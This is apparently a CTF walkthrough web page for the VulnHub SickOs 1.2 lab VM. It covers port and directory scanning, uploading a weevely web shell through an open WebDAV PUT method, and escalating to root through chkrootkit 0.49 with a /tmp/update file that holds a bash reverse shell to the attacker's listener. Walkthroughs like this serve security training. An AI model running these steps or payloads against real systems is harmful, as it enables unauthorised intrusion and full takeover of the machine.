@@ -1,0 +1,197 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>pwncone.io</title>
+    <link rel="stylesheet" href="../../../css/style.css">
+  </head>
+
+<body>
+
+<section>
+
+    <writeup>
+        <h1><strong>#SickOs: 1.2</strong></h1>
+        <a href="https://www.vulnhub.com/entry/sickos-12,144/">https://www.vulnhub.com/entry/sickos-12,144/</a><br>
+        <br>
+        This is quite a fun, manual, less tool-reliant box.<br>
+        <br>
+        <a id="h3-1" name="h3-1"></a><strong></strong>
+        <h3><strong>0) Find the VM's IP</strong></h3><br>
+        To find your VM's IP address, set your VM to ‘bridged’ so that it gets assigned an IP on your internal network and then use netdiscover to scan your network: <code>netdiscover -r &lt;internal network&gt;/24</code><br>
+        <br>
+        <code>netdiscover -r 192.168.1.1/24</code><br>
+        192.168.1.177 is my SickOS: 1.2 box.<br>
+        Take a snapshot of the VM at this point, just to be safe.<br>
+        <br>
+        <a id="h2-1" name="h2-1"></a><strong></strong>
+        <h2><strong>1) Nmap</strong></h2><br>
+        Initial scan:<br>
+        <code>nmap -sC -sV -O -oN nmap/initial.txt 192.168.1.177</code><br>
+        <br>
+        -sC default scripts<br>
+        -sV service enumeration<br>
+        -O OS detection<br>
+        -oN default output<br>
+        <br>
+        Results:<br>
+            <div class="codebox">
+                root@kali<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>sickOS#&nbsp;nmap&nbsp;-sC&nbsp;-sV&nbsp;-O&nbsp;-oN&nbsp;nmap<span style="color:#ff9d00;font-weight:700">/</span>initial.txt&nbsp;192.168.1.177<br>
+                Starting&nbsp;Nmap&nbsp;7.70&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>&nbsp;https<span style="color:#ff9d00;font-weight:700">://</span>nmap.org&nbsp;<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;at&nbsp;2019-04-12&nbsp;11<span style="color:#ff9d00;font-weight:700">:</span>39&nbsp;BST<br>
+                Nmap&nbsp;scan&nbsp;report&nbsp;<span style="color:#ff9d00;font-weight:700">for</span>&nbsp;<span style="color:#7f0044;font-weight:400">ubuntu</span>.lan&nbsp;(192.168.1.177)<br>
+                Host&nbsp;is&nbsp;up&nbsp;(0.00019s&nbsp;latency).<br>
+                Not&nbsp;shown:&nbsp;998&nbsp;filtered&nbsp;ports<br>
+                PORT&nbsp;&nbsp;&nbsp;STATE&nbsp;SERVICE&nbsp;VERSION<br>
+                22/tcp&nbsp;open&nbsp;&nbsp;ssh&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;OpenSSH&nbsp;5.9p1&nbsp;Debian&nbsp;5ubuntu1.8&nbsp;(Ubuntu&nbsp;Linux;&nbsp;protocol&nbsp;2.0)<br>
+                |&nbsp;ssh-hostkey:&nbsp;<br>
+                |&nbsp;&nbsp;&nbsp;1024&nbsp;66:8c:c0:f2:85:7c:6c:c0:f6:ab:7d:48:04:81:c2:d4&nbsp;(DSA)<br>
+                |&nbsp;&nbsp;&nbsp;2048&nbsp;ba:86:f5:ee:cc:83:df:a6:3f:fd:c1:34:bb:7e:62:ab&nbsp;(RSA)<br>
+                |_&nbsp;&nbsp;256&nbsp;a1:6c:fa:18:da:57:1d:33:2c:52:e4:ec:97:e2:9e:af&nbsp;(ECDSA)<br>
+                80/tcp&nbsp;open&nbsp;&nbsp;http&nbsp;&nbsp;&nbsp;&nbsp;lighttpd&nbsp;1.4.28<br>
+                |_http-server-header:&nbsp;lighttpd/1.4.28<br>
+                |_http-title:&nbsp;Site&nbsp;doesn't&nbsp;have&nbsp;a&nbsp;title&nbsp;(text/html).<br>
+                MAC&nbsp;Address:&nbsp;00:0C:29:A8:AC:38&nbsp;(VMware)<br>
+                Warning:&nbsp;OSScan&nbsp;results&nbsp;may&nbsp;be&nbsp;unreliable&nbsp;because&nbsp;we&nbsp;could&nbsp;not&nbsp;find&nbsp;at&nbsp;least&nbsp;1&nbsp;open&nbsp;and&nbsp;1&nbsp;closed&nbsp;port<br>
+                Device&nbsp;type:&nbsp;general&nbsp;purpose<br>
+                Running:&nbsp;Linux&nbsp;3.X|4.X<br>
+                OS&nbsp;CPE:&nbsp;cpe:/o:linux:linux_kernel:3&nbsp;cpe:/o:linux:linux_kernel:4<br>
+                OS&nbsp;details:&nbsp;Linux&nbsp;3.10&nbsp;-&nbsp;4.11,&nbsp;Linux&nbsp;3.16&nbsp;-&nbsp;4.6,&nbsp;Linux&nbsp;3.2&nbsp;-&nbsp;4.9,&nbsp;Linux&nbsp;4.4<br>
+                Network&nbsp;Distance:&nbsp;1&nbsp;hop<br>
+                Service&nbsp;Info:&nbsp;OS:&nbsp;Linux;&nbsp;CPE:&nbsp;cpe:/o:linux:linux_kernel<br>
+                <br>
+                OS&nbsp;and&nbsp;Service&nbsp;detection&nbsp;performed.&nbsp;Please&nbsp;report&nbsp;any&nbsp;incorrect&nbsp;results&nbsp;at&nbsp;https://nmap.org/submit/&nbsp;.<br>
+                Nmap&nbsp;done:&nbsp;1&nbsp;IP&nbsp;address&nbsp;(1&nbsp;host&nbsp;up)&nbsp;scanned&nbsp;<span style="color:#ff9d00;font-weight:700">in</span>&nbsp;13.54&nbsp;seconds
+            </div>
+        </div><br>
+        <br>
+        80/http is all we need.<br>
+        <br>
+        <a id="h2-2" name="h2-2"></a><strong></strong>
+        <h2><strong>2) 80/http</strong></h2><br>
+        Gobuster finds /test.php<br>
+            <div class="codebox">
+                root@kali<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>sickOS#&nbsp;<span style="color:#ff9d00;font-weight:700">mkdir</span>&nbsp;80http<br>
+                root@kali<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>sickOS#&nbsp;gobuster&nbsp;-e&nbsp;-u&nbsp;http<span style="color:#ff9d00;font-weight:700">://</span>192.168.1.177<span style="color:#ff9d00;font-weight:700">/</span>&nbsp;-w&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>usr<span style="color:#ff9d00;font-weight:700">/</span>share<span style="color:#ff9d00;font-weight:700">/</span>seclists<span style="color:#ff9d00;font-weight:700">/</span>Discovery<span style="color:#ff9d00;font-weight:700">/</span>Web-Content<span style="color:#ff9d00;font-weight:700">/</span>common.txt&nbsp;-o&nbsp;gb-common.txt<br>
+                root@kali<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>sickOScat&nbsp;gb-common.txt<br>
+                http<span style="color:#ff9d00;font-weight:700">://</span>192.168.1.177<span style="color:#ff9d00;font-weight:700">/</span>index.php&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>Status<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;200<span style="color:#ff9d00;font-weight:700">)</span><br>
+                http<span style="color:#ff9d00;font-weight:700">://</span>192.168.1.177<span style="color:#ff9d00;font-weight:700">/</span>test&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>Status<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;301<span style="color:#ff9d00;font-weight:700">)</span>
+            </div>
+        </div><br>
+        <br>
+        /test.php is a directory listing.<br>
+        Check the HTTP methods of the page with an OPTIONS request.<br>
+            <div class="codebox">
+                root@kali<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>sickOS<span style="color:#ff9d00;font-weight:700">/</span>80http#&nbsp;curl&nbsp;-X&nbsp;OPTIONS&nbsp;http<span style="color:#ff9d00;font-weight:700">://</span>192.168.1.177<span style="color:#ff9d00;font-weight:700">/</span>test&nbsp;-i<br>
+                HTTP<span style="color:#ff9d00;font-weight:700">/</span>1.1&nbsp;301&nbsp;Moved&nbsp;Permanently<br>
+                DAV<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;1,2<br>
+                MS-Author-Via<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;DAV<br>
+                Allow<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;PROPFIND,&nbsp;DELETE,&nbsp;MKCOL,&nbsp;PUT,&nbsp;MOVE,&nbsp;COPY,&nbsp;PROPPATCH,&nbsp;LOCK,&nbsp;UNLOCK<br>
+                Location<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;http<span style="color:#ff9d00;font-weight:700">://</span>192.168.1.177<span style="color:#ff9d00;font-weight:700">/</span>test<span style="color:#ff9d00;font-weight:700">/</span><br>
+                Content-Length<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;0<br>
+                Date<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;Fri,&nbsp;12&nbsp;Apr&nbsp;2019&nbsp;11<span style="color:#ff9d00;font-weight:700">:</span>54<span style="color:#ff9d00;font-weight:700">:</span>45&nbsp;GMT<br>
+                Server<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;lighttpd<span style="color:#ff9d00;font-weight:700">/</span>1.4.28
+            </div>
+        </div><br>
+        <br>
+        PUT is allowed, meaning we can upload files. Time for a shell.<br>
+        I used weevely, since pentestmonkey's php-reverse-shell wouldn't daemonise for me :/<br>
+            <div class="codebox">
+                root@kali<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>sickOS<span style="color:#ff9d00;font-weight:700">/</span>80http#&nbsp;weevely&nbsp;generate&nbsp;hey&nbsp;weevely_hey.php<br>
+                Generated&nbsp;<span style="color:#3ad900;font-weight:400">'weevely_hey.php'</span>&nbsp;with&nbsp;password&nbsp;<span style="color:#3ad900;font-weight:400">'hey'</span>&nbsp;of&nbsp;698&nbsp;byte&nbsp;size.<br>
+                root@kali<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>sickOS<span style="color:#ff9d00;font-weight:700">/</span>80http#&nbsp;nmap&nbsp;-p&nbsp;80&nbsp;192.168.1.177&nbsp;--script&nbsp;http-put&nbsp;--script-args&nbsp;http-put.url=<span style="color:#3ad900;font-weight:400">'/test/moon2hey.php'</span>,http-put.file=<span style="color:#3ad900;font-weight:400">'weevely_hey.php'</span><br>
+                Starting&nbsp;Nmap&nbsp;7.70&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>&nbsp;https<span style="color:#ff9d00;font-weight:700">://</span>nmap.org&nbsp;<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;at&nbsp;2019-04-12&nbsp;12<span style="color:#ff9d00;font-weight:700">:</span>15&nbsp;BST<br>
+                Nmap&nbsp;scan&nbsp;report&nbsp;<span style="color:#ff9d00;font-weight:700">for</span>&nbsp;<span style="color:#7f0044;font-weight:400">ubuntu</span>.lan&nbsp;(192.168.1.177)<br>
+                Host&nbsp;is&nbsp;up&nbsp;(0.00019s&nbsp;latency).<br>
+                <br>
+                PORT&nbsp;&nbsp;&nbsp;STATE&nbsp;SERVICE<br>
+                80/tcp&nbsp;open&nbsp;&nbsp;http<br>
+                |_http-put:&nbsp;/test/moon2hey.php&nbsp;was&nbsp;successfully&nbsp;created<br>
+                MAC&nbsp;Address:&nbsp;00:0C:29:A8:AC:38&nbsp;(VMware)<br>
+                <br>
+                Nmap&nbsp;done:&nbsp;1&nbsp;IP&nbsp;address&nbsp;(1&nbsp;host&nbsp;up)&nbsp;scanned&nbsp;<span style="color:#ff9d00;font-weight:700">in</span>&nbsp;0.40&nbsp;seconds<br>
+                root@kali<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>sickOS<span style="color:#ff9d00;font-weight:700">/</span>80http#&nbsp;weevely&nbsp;http<span style="color:#ff9d00;font-weight:700">://</span>192.168.1.177<span style="color:#ff9d00;font-weight:700">/</span>test<span style="color:#ff9d00;font-weight:700">/</span>moon2hey.php&nbsp;hey<br>
+                <br>
+                [+]&nbsp;weevely&nbsp;3.7.0<br>
+                <br>
+                [+]&nbsp;Target<span style="color:#ff9d00;font-weight:700">:</span> 192.168.1.177<br>
+                [+]&nbsp;Session<span style="color:#ff9d00;font-weight:700">:</span> <span style="color:#ff9d00;font-weight:700">/</span>root<span style="color:#ff9d00;font-weight:700">/</span>.weevely<span style="color:#ff9d00;font-weight:700">/</span>sessions<span style="color:#ff9d00;font-weight:700">/</span>192.168.1.177<span style="color:#ff9d00;font-weight:700">/</span>moon2hey_0.session<br>
+                <br>
+                [+]&nbsp;Browse&nbsp;the&nbsp;filesystem&nbsp;or&nbsp;execute&nbsp;commands&nbsp;starts&nbsp;the&nbsp;connection<br>
+                [+]&nbsp;to&nbsp;the&nbsp;target.&nbsp;Type&nbsp;<span style="color:#ff9d00;font-weight:700">:</span>help&nbsp;<span style="color:#ff9d00;font-weight:700">for</span>&nbsp;<span style="color:#7f0044;font-weight:400">more</span>&nbsp;information.<br>
+                <br>
+                weevely&gt;&nbsp;ls<br>
+                monkey.php<br>
+                moon2hey.php<br>
+                www-data@ubuntu:/var/www/test&nbsp;$&nbsp;
+            </div>
+        </div><br>
+        <br>
+        <a id="h2-3" name="h2-3"></a><strong></strong>
+        <h2><strong>3) www-data -&gt; root</strong></h2><br>
+        Have a browse of the cronjobs:<br>
+            <div class="codebox">
+                www-data@ubuntu<span style="color:#ff9d00;font-weight:700">:/</span>home&nbsp;$&nbsp;<span style="color:#ff9d00;font-weight:700">ls</span>&nbsp;-alh&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>etc<span style="color:#ff9d00;font-weight:700">/</span>cron*<br>
+                -rw<span style="color:#ffdd00;font-weight:400">-r</span>--r--&nbsp;1&nbsp;root&nbsp;root&nbsp;&nbsp;722&nbsp;Jun&nbsp;19&nbsp;&nbsp;2012&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>etc<span style="color:#ff9d00;font-weight:700">/</span>crontab<br>
+                <br>
+                <span style="color:#ff9d00;font-weight:700">ls:</span>&nbsp;cannot&nbsp;open&nbsp;directory&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>etc<span style="color:#ff9d00;font-weight:700">/</span>cron.d<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;Permission&nbsp;denied<br>
+                <span style="color:#ff9d00;font-weight:700">/</span>etc<span style="color:#ff9d00;font-weight:700">/</span>cron.daily<span style="color:#ff9d00;font-weight:700">:</span><br>
+                total&nbsp;72K<br>
+                drwxr-xr<span style="color:#ffdd00;font-weight:400">-x</span>&nbsp;&nbsp;2&nbsp;root&nbsp;root&nbsp;4.0K&nbsp;Apr&nbsp;12&nbsp;&nbsp;2016&nbsp;.<br>
+                drwxr-xr<span style="color:#ffdd00;font-weight:400">-x</span>&nbsp;84&nbsp;root&nbsp;root&nbsp;4.0K&nbsp;Apr&nbsp;12&nbsp;04<span style="color:#ff9d00;font-weight:700">:</span>38&nbsp;..<br>
+                -rw<span style="color:#ffdd00;font-weight:400">-r</span>--r--&nbsp;&nbsp;1&nbsp;root&nbsp;root&nbsp;&nbsp;102&nbsp;Jun&nbsp;19&nbsp;&nbsp;2012&nbsp;.placeholder<br>
+                -rwxr-xr<span style="color:#ffdd00;font-weight:400">-x</span>&nbsp;&nbsp;1&nbsp;root&nbsp;root&nbsp;&nbsp;16K&nbsp;Nov&nbsp;15&nbsp;&nbsp;2013&nbsp;apt<br>
+                -rwxr-xr<span style="color:#ffdd00;font-weight:400">-x</span>&nbsp;&nbsp;1&nbsp;root&nbsp;root&nbsp;&nbsp;314&nbsp;Apr&nbsp;18&nbsp;&nbsp;2013&nbsp;aptitude<br>
+                -rwxr-xr<span style="color:#ffdd00;font-weight:400">-x</span>&nbsp;&nbsp;1&nbsp;root&nbsp;root&nbsp;&nbsp;502&nbsp;Mar&nbsp;31&nbsp;&nbsp;2012&nbsp;bsdmainutils<br>
+                -rwxr-xr<span style="color:#ffdd00;font-weight:400">-x</span>&nbsp;&nbsp;1&nbsp;root&nbsp;root&nbsp;2.0K&nbsp;Jun&nbsp;&nbsp;4&nbsp;&nbsp;2014&nbsp;chkrootkit<br>
+                ...<br>
+                www-data@ubuntu<span style="color:#ff9d00;font-weight:700">:/</span>home&nbsp;$&nbsp;chkrootkit&nbsp;-V<br>
+                chkrootkit&nbsp;version&nbsp;0.49
+            </div>
+        </div><br>
+        <br>
+        <code>chkrootkit</code> version 0.49 (<a href="https://www.exploit-db.com/exploits/33899">https://www.exploit-db.com/exploits/33899</a>) is a good privilege escalation binary because it runs the file <code>/tmp/update</code> as root.<br>
+        On this box, you can make our own <code>/tmp/update</code> (because it doesn't exist already) and put whatever commands you like in it.<br>
+        The commands you enter will be run as root.<br>
+        <br>
+        I chose to use a reverse shell to get root, it's what stood out to me at the time :shrug:<br>
+        Start a listener:<br>
+            <div class="codebox">
+                root@kali<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>sickOS#&nbsp;nc&nbsp;-lvnp&nbsp;8080<br>
+                listening&nbsp;on&nbsp;[any]&nbsp;8080&nbsp;...
+            </div>
+        </div><br>
+        <br>
+        Create <code>/tmp/update</code>, echo your commands in and wait for it to run.<br>
+            <div class="codebox">
+                www-data@ubuntu<span style="color:#ff9d00;font-weight:700">:/</span>home&nbsp;$&nbsp;<span style="color:#ff9d00;font-weight:700">cd</span>&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>tmp<br>
+                www-data@ubuntu<span style="color:#ff9d00;font-weight:700">:/</span>tmp&nbsp;$&nbsp;<span style="color:#ff9d00;font-weight:700">echo</span>&nbsp;<span style="color:#3ad900;font-weight:400">"#!/bin/bash"</span>&nbsp;&gt;&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>tmp<span style="color:#ff9d00;font-weight:700">/</span>update<br>
+                www-data@ubuntu<span style="color:#ff9d00;font-weight:700">:/</span>tmp&nbsp;$&nbsp;<span style="color:#ff9d00;font-weight:700">echo</span>&nbsp;<span style="color:#3ad900;font-weight:400">"bash&nbsp;-i&nbsp;&gt;&amp;&nbsp;/dev/tcp/192.168.1.183/8080&nbsp;0&gt;&amp;1"</span>&nbsp;&gt;&gt;&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>tmp<span style="color:#ff9d00;font-weight:700">/</span>update<br>
+                www-data@ubuntu<span style="color:#ff9d00;font-weight:700">:/</span>tmp&nbsp;$&nbsp;<span style="color:#ff9d00;font-weight:700">chmod</span>&nbsp;+x&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>tmp<span style="color:#ff9d00;font-weight:700">/</span>update<br>
+                www-data@ubuntu<span style="color:#ff9d00;font-weight:700">:/</span>tmp&nbsp;$&nbsp;<span style="color:#ff9d00;font-weight:700">cat</span>&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>tmp<span style="color:#ff9d00;font-weight:700">/</span>update<br>
+                <span style="color:#0088ff;font-weight:400">#!/bin/bash</span><br>
+                <span style="color:#ff9d00;font-weight:700">bash</span>&nbsp;-i&nbsp;&gt;<span style="color:#ff9d00;font-weight:700">&amp;</span>&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>dev<span style="color:#ff9d00;font-weight:700">/</span>tcp<span style="color:#ff9d00;font-weight:700">/</span>192.168.1.183<span style="color:#ff9d00;font-weight:700">/</span>8080&nbsp;<span style="color:#ff9d00;font-weight:700">0&gt;&amp;</span>1<br>
+                www-data@ubuntu<span style="color:#ff9d00;font-weight:700">:/</span>tmp&nbsp;$&nbsp;
+            </div>
+        </div><br>
+        <br>
+        Wait a minute or so and you should receive a call back on your listener:<br>
+            <div class="codebox">
+                root@kali<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>sickOS#&nbsp;nc&nbsp;-lvnp&nbsp;8080<br>
+                listening&nbsp;on&nbsp;[any]&nbsp;8080&nbsp;...<br>
+                connect&nbsp;to&nbsp;[192.168.1.183]&nbsp;from&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>UNKNOWN<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;[192.168.1.177]&nbsp;44068<br>
+                <span style="color:#ff9d00;font-weight:700">bash:</span>&nbsp;no&nbsp;job&nbsp;control&nbsp;<span style="color:#ff9d00;font-weight:700">in</span>&nbsp;this&nbsp;shell<br>
+                root@ubuntu<span style="color:#ff9d00;font-weight:700">:</span>~#&nbsp;<span style="color:#ff9d00;font-weight:700">id</span><br>
+                <span style="color:#ff9d00;font-weight:700">id</span><br>
+                <span style="color:#7f0044;font-weight:400">uid</span>=0<span style="color:#ff9d00;font-weight:700">(</span>root<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;gid=0<span style="color:#ff9d00;font-weight:700">(</span>root<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;<span style="color:#ff9d00;font-weight:700">groups</span>=0<span style="color:#ff9d00;font-weight:700">(</span>root<span style="color:#ff9d00;font-weight:700">)</span><br>
+                root@ubuntu<span style="color:#ff9d00;font-weight:700">:</span>~#&nbsp;
+            </div>
+        </div><br>
+        <br>
+        Root!
+    </writeup>
+</section>
+
+</body>
+</html>
